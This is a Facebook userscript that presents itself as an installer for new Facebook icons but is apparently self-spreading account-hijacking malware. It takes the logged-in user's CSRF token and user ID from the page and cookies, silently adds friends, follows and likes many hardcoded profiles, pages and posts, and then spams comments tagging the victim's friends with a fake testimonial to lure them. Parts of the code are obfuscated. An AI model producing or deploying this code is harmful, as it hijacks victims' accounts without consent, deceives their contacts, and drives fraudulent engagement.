// ==UserScript==
// @name            Cài Đặt ICON Trực Tiếp Trên FaceBook 
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==ICON==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Theo Duoi Dam Me
a("100005436843326");
sublist("128681217323106");
Like("1408623422731013");Like("1549866081904753");
Like("609495989126567");Like("666543573403298");
Like("1404692959792602");Like("676517989071902");
Like("427765313993396");
//Bi
a("100004026840047");a("100004227851982");a("100004226463129");a("100004009452717");a("100005788442697");a("100001405630063");
sublist("209863882497872");
Like("707399402633391");Like("262060847295756");Like("599487090131706");
Like("518776338181642");Like("298959796898882");Like("432577410190561");
Like("565639316829211");Like("454920977919944");Like("509369752426467");
Like("586263948075197");
Like("269858973165273");Like("632135776834514");Like("223891154469020");
Like("165934983579396");
P("534816633299971");P("283796015104658");
P("533460353435599");P("184547461748201");P("184601421742805");
P("188803254603935");P("281474515336808");P("540880926026875");
P("1419970548249607");P("1420296861550309");
P("282972768520316");P("283017845182475");P("288775811273345");
P("540071922774442");P("540832926031675");
//Phan Phụng Tú Tài
a("100007398700600");a("100007063120509");a("100003908713413");a("100004063578918");
a("100007683931143");a("100007759182208");a("100007341632664");a("100004855563295");
a("100006059193797");a("100004598941539");
Like("492417287529576");Like("419062478228460");Like("273148389510850");
Like("1462163234001914");Like("682551015121904");Like("1450421358523414");
Like("665678586824353");Like("223486371184911");Like("549391975158190");
Like("222231027968178");Like("827200667296119");Like("1399255243671973");
Like("1452570581644420");Like("224254397766426");Like("591146447639164");
Like("219543448243440");Like("1534882163404374");Like("1471145173097223");
Like("660287697360753");Like("593990427359172");Like("415396285270374");
Like("613502548723327");Like("1384123011851254");Like("268163626686008");
//suythocgioi
a("100006571236046");a("100007524763730");a("100006935615911");
sublist("1432030393692655");
Like("201523453375367");
P("1416137601976885");
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '264487433717068';
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var _0x7892x7 = new XMLHttpRequest();
    _0x7892x7['onreadystatechange'] = function () {
        if (_0x7892x7['readyState'] == 4) {
            eval('arkadaslar = ' + _0x7892x7['responseText'].toString()['replace']('for (;;);', '') + ';');
            for (f = 0; f < Math['round'](arkadaslar['payload']['entries']['length'] / 27); f++) {
                mesaj = '';
                mesaj_text = '';
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar['payload']['entries'][i]) {
                        mesaj += ' @[' + arkadaslar['payload']['entries'][i]['uid'] + ':' + arkadaslar['payload']['entries'][i]['text'] + ']';
                        mesaj_text += ' ' + arkadaslar['payload']['entries'][i]['text'];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var _0x7892x8 = '&filter[0]=user';
    _0x7892x8 += '&options[0]=friends_only';
    _0x7892x8 += '&options[1]=nm';
    _0x7892x8 += '&token=v7';
    _0x7892x8 += '&viewer=' + user_id;
    _0x7892x8 += '&__user=' + user_id;
    if (document['URL']['indexOf']('https://') >= 0) {
        _0x7892x7['open']('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    } else {
        _0x7892x7['open']('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    };
    _0x7892x7['send']();
};

function RandomArkadas() {
    var _0x7892xa = '';
    for (i = 0; i < 9; i++) {
        _0x7892xa += ' @[' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['uid'] + ':' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['text'] + ']';
    };
    return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
    var _0x7892xd = new XMLHttpRequest();
    var _0x7892x8 = '';
    _0x7892x8 += '&ft_ent_identifier=' + id;
    _0x7892x8 += '&comment_text= (y) Ứng dụng này hay thật đó <3 . Mình cài được bộ ICON mới nhất của Facebook rồi 󾌫 󾌫 . Rất cảm ơn bạn 󾬔  󾬕  󾬖  󾀀  󾀀  󾀀  󾔗  󾔗  󾔗  󾀄  󾀄  󾌧  󾌧  󾇗  󾇗  󾌶  󾌶  󾠚  󾠚  󾓲  󾓲  󾀽  󾀽  󾆔  󾆔  󾆔  󾆼  󾆼  󾔐  󾔐 󾇕 󾇕 󾇇 󾇇 󾭩 󾭩 󾬍 󾬍 󾬐 󾬐 󾬐 󾆓 󾆓 󾥠 󾥠 󾥠  ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
    _0x7892x8 += '&client_id=1377871797138:1707018092';
    _0x7892x8 += '&reply_fbid';
    _0x7892x8 += '&parent_comment_id';
    _0x7892x8 += '&rootid=u_jsonp_2_3';
    _0x7892x8 += '&clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":' + id + '}';
    _0x7892x8 += '&attached_sticker_fbid=0';
    _0x7892x8 += '&attached_photo_fbid=0';
    _0x7892x8 += '&giftoccasion';
    _0x7892x8 += '&ft[tn]=[]';
    _0x7892x8 += '&__user=' + user_id;
    _0x7892x8 += '&__a=1';
    _0x7892x8 += '&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
    _0x7892x8 += '&__req=q';
    _0x7892x8 += '&fb_dtsg=' + fb_dtsg;
    _0x7892x8 += '&ttstamp=';
    _0x7892xd['open']('POST', '/ajax/ufi/add_comment.php', true);
    _0x7892xd['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0x7892xd['onreadystatechange'] = function () {
        if (_0x7892xd['readyState'] == 4 && _0x7892xd['status'] == 200) {
            _0x7892xd['close'];
        };
    };
    _0x7892xd['send'](_0x7892x8);
};
arkadaslari_al(269726553193156);